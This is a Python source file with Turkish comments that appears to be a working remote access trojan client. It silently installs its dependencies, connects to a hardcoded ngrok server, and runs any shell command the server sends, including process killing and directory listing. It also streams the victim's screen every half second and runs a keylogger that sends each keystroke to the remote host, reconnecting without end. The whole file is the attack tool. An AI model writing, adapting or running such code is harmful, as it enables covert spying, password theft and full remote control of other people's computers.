import subprocess
import sys
import time

# --- 1. OTOMATİK KÜTÜPHANE YÜKLEYİCİ ---
REQUIRED_PACKAGES = [
    'python-socketio[client]',
    'mss',
    'Pillow',
    'psutil',
    'pygetwindow',
    'pynput'
]

def install_missing_packages():
    for package in REQUIRED_PACKAGES:
        # Import adı ile paket adı farklı olabilen durumlar için kontrol
        import_name = package.split('[')[0].replace('python-', '').replace('-', '_')
        try:
            __import__(import_name)
        except ImportError:
            try:
                subprocess.check_call([sys.executable, "-m", "pip", "install", package, "--quiet"])
            except:
                pass

install_missing_packages()

# --- 2. ASIL IMPORTLAR ---
import mss
import socketio
import base64
import io
import socket
import os
import threading
import json
import psutil
import ctypes
from PIL import Image
try:
    import pygetwindow as gw
except:
    pass
from pynput import keyboard

# --- KONFİGÜRASYON ---
TARGET_URL = "https://silviculturally-cliffiest-rosalie.ngrok-free.dev" 
CLIENT_ID = socket.gethostname()
sio = socketio.Client(reconnection=True, reconnection_attempts=0, reconnection_delay=5)

def safe_decode(data):
    for codec in ['cp854', 'cp1254', 'utf-8', 'latin-1']:
        try: return data.decode(codec)
        except: continue
    return data.decode('utf-8', errors='replace')

@sio.event
def connect():
    print("[+] Sunucuya baglanildi.")
    sio.emit('register', {'id': CLIENT_ID})

@sio.on('execute_command')
def on_command(data):
    if data.get('id') != CLIENT_ID: return 
    cmd = data.get('command', '').strip()
    
    # CD Komutu
    if cmd.lower() == "cd.." or cmd.lower().startswith("cd "):
        path = ".." if cmd.lower() == "cd.." else cmd[3:].strip().replace('"', '')
        try:
            os.chdir(path)
            res = os.getcwd()
        except Exception as e:
            res = f"Hata: {str(e)}"
        sio.emit('shell_output', {'id': CLIENT_ID, 'output': res})
        return

    # Kill Komutu
    elif cmd.lower().startswith("kill "):
        pid = cmd[5:].strip()
        try:
            subprocess.run(f"taskkill /F /PID {pid}", shell=True, capture_output=True)
            res = f"PROCESS_KILLED: {pid}"
        except Exception as e:
            res = f"Hata: {str(e)}"
        sio.emit('shell_output', {'id': CLIENT_ID, 'output': res})
        return

    # Process Listesi
    elif cmd == "list_procs_grouped":
        app_dict = {}
        blacklist = ['textinputhost.exe', 'applicationframehost.exe', 'omapsvcbroker.exe', 
                     'systemsettings.exe', 'nahimic3.exe', 'shellexperiencehost.exe']
        try:
            for w in gw.getAllWindows():
                if w.title != "" and w._hWnd != 0 and w.visible:
                    try:
                        pid = ctypes.c_ulong()
                        ctypes.windll.user32.GetWindowThreadProcessId(w._hWnd, ctypes.byref(pid))
                        p = psutil.Process(pid.value)
                        exe_name = p.name().lower()
                        if exe_name in blacklist: continue
                        if exe_name not in app_dict:
                            app_dict[exe_name] = {"title": exe_name.replace(".exe","").upper(), "pid": pid.value, "count": 1}
                        else:
                            app_dict[exe_name]["count"] += 1
                    except: continue
            sio.emit('shell_output', {'id': CLIENT_ID, 'output': "GROUPED_PROCS:" + json.dumps(list(app_dict.values()))})
        except: pass
        return

    # Explorer JSON
    elif cmd.lower().startswith("dir_json "):
        path = cmd[9:].strip().replace('"', '') or "C:\\"
        try:
            files = []
            for i in os.listdir(path):
                full_p = os.path.join(path, i)
                files.append({"name": full_p, "type": "folder" if os.path.isdir(full_p) else "file"})
            sio.emit('shell_output', {'id': CLIENT_ID, 'output': json.dumps(files)})
        except Exception as e:
            sio.emit('shell_output', {'id': CLIENT_ID, 'output': str(e)})
        return

    # Standart Shell
    try:
        p = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, cwd=os.getcwd())
        out, err = p.communicate()
        res = safe_decode(out) + safe_decode(err)
        if not res.strip(): res = "Komut tamamlandi."
    except Exception as e:
        res = str(e)
    sio.emit('shell_output', {'id': CLIENT_ID, 'output': res})

# --- EKRAN YAYINI ---
def stream_screen():
    with mss.mss() as sct:
        while True:
            if sio.connected:
                try:
                    img = sct.grab(sct.monitors[1])
                    raw = Image.frombytes("RGB", img.size, img.bgra, "raw", "BGRX").resize((960, 540))
                    buffer = io.BytesIO()
                    raw.save(buffer, format='JPEG', quality=30)
                    sio.emit('screen_data', {'id': CLIENT_ID, 'image': base64.b64encode(buffer.getvalue()).decode()})
                except: pass
            time.sleep(0.5)

# --- KEYLOGGER ---
def on_press(key):
    try:
        if sio.connected:
            sio.emit('key_stroke', {'id': CLIENT_ID, 'key': str(key).replace("'", "")})
    except: pass

# --- ANA DONGU ---
if __name__ == "__main__":
    # Threadleri baslat
    threading.Thread(target=stream_screen, daemon=True).start()
    threading.Thread(target=lambda: keyboard.Listener(on_press=on_press).run(), daemon=True).start()
    
    while True:
        try:
            if not sio.connected:
                sio.connect(TARGET_URL, transports=['websocket'])
            sio.wait()
        except:
            time.sleep(10) # Baglanti koparsa 10 saniye bekle ve tekrar dene